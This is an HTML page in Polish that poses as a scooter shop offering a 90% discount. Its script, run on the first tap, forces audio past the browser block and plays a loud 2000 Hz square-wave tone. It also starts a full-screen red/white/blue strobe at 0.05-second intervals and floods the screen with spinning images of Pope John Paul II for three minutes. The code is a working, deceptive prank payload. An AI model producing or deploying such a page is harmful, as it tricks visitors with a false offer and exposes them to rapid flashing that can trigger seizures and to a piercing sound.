<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HULAJNOGI - SKLEP</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            overflow: hidden; background: #fff; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; touch-action: none;
        }
        #promo { text-align: center; cursor: pointer; }
        .scooter { font-size: 80px; }
        
        /* Kontener na spam zdjęć */
        #chaos-container {
            display: none; position: fixed; top: 0; left: 0;
            width: 100%; height: 100%; z-index: 9999;
        }

        /* Animacja migania */
        @keyframes strobe {
            0% { background: #ff0000; }
            50% { background: #fff; }
            100% { background: #0000ff; }
        }
        .strobe-active { animation: strobe 0.05s infinite; }

        /* Animacja latających zdjęć */
        .flying-img {
            position: absolute; width: 150px; z-index: 10000;
            animation: spin 0.2s infinite linear;
        }
        @keyframes spin {
            from { transform: rotate(0deg) scale(1.5); }
            to { transform: rotate(360deg) scale(0.5); }
        }
    </style>
</head>
<body onclick="launch()">

    <div id="promo">
        <h1>NAJLEPSZE HULAJNOGI 2026</h1>
        <div class="scooter">🛴</div>
        <p>DOTKNIJ EKRANU, ABY ODEBRAĆ RABAT -90%</p>
    </div>

    <div id="chaos-container"></div>

    <script>
        let isRunning = false;
        const imgUrl = "https://upload.wikimedia.org/wikipedia/commons/5/5b/Jan_Pawe%C5%82_II_-_u%C5%9bmiechni%C4%99ty.jpg";

        function launch() {
            if (isRunning) return;
            isRunning = true;

            // 1. OMINIĘCIE BLOKADY AUDIO (Audio Context Resume)
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const audioCtx = new AudioContext();
            
            // Wymuszenie startu audio na mobilkach
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }

            // Tworzenie ultra-pisku
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'square'; // Najbardziej agresywny typ fali
            osc.frequency.setValueAtTime(2000, audioCtx.currentTime); 
            gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();

            // 2. URUCHOMIENIE WIZUALNEGO CHAOSU
            document.getElementById('promo').style.display = 'none';
            const container = document.getElementById('chaos-container');
            container.style.display = 'block';
            container.classList.add('strobe-active');

            // 3. SPAM ZDJĘCIAMI (Respią się wszędzie)
            const spawnInterval = setInterval(() => {
                const img = document.createElement('img');
                img.src = imgUrl;
                img.className = 'flying-img';
                img.style.left = Math.random() * (window.innerWidth - 100) + 'px';
                img.style.top = Math.random() * (window.innerHeight - 100) + 'px';
                container.appendChild(img);

                // Usuwanie, żeby nie zacięło telefonu
                setTimeout(() => img.remove(), 1000);
            }, 50); // Nowe zdjęcie co 0.05 sekundy!

            // 4. AUTO-WYŁĄCZENIE PO 3 MINUTACH
            setTimeout(() => {
                clearInterval(spawnInterval);
                osc.stop();
                location.reload(); 
            }, 180000);
        }
    </script>
</body>
</html>
